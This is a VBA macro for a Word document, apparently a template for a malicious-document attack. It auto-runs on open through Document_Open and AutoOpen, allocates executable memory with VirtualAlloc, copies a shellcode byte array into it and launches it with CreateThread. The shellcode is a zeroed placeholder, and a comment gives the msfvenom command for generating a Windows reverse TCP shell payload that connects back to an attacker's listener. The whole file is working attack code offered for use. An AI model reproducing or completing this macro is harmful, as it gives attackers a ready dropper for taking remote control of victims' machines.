Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr


Function TargetMacro()
    Dim buf As Variant 
    Dim addr As LongPtr 
    Dim counter As Long 
    Dim data As Long 
    Dim res As Long

    ' TODO: Replace this placeholder with shellcode generated for your listener.
    ' Generate with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f vbapplication
    ' The byte array below is a zeroed placeholder — it will not execute.
    buf = Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)


    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter


    res = CreateThread(0, 0, addr, 0, 0, 0) End Function
Sub Document_Open() 
    TargetMacro
End Sub
Sub AutoOpen() 
    TargetMacro
End Sub